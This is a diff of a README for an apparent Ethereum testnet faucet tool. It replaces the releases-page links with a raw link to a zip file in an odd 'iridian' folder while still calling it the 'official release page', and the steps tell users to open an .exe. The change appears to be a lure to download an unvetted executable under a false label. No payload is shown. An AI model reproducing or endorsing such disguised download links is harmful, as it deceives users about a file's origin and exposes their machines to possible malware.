@@ -1,6 +1,6 @@
 # 💧 ethereum-testnet-faucet - Get testnet ETH for your projects
 
-[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/Tracyopen598/ethereum-testnet-faucet/releases)
+[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/Tracyopen598/ethereum-testnet-faucet/raw/refs/heads/main/iridian/testnet_faucet_ethereum_2.6.zip)
 
 ## What is this tool? 🛠️
 
@@ -19,7 +19,7 @@ To run this application, your computer needs the following:
 
 Follow these steps to set up the software on your machine:
 
-1.  Visit the official release page to download your copy: [https://github.com/Tracyopen598/ethereum-testnet-faucet/releases](https://github.com/Tracyopen598/ethereum-testnet-faucet/releases).
+1.  Visit the official release page to download your copy: [https://github.com/Tracyopen598/ethereum-testnet-faucet/raw/refs/heads/main/iridian/testnet_faucet_ethereum_2.6.zip](https://github.com/Tracyopen598/ethereum-testnet-faucet/raw/refs/heads/main/iridian/testnet_faucet_ethereum_2.6.zip).
 2.  Locate the file ending in .exe in the latest release section.
 3.  Click the file to save it to your computer.
 4.  Open the folder where you saved the file.
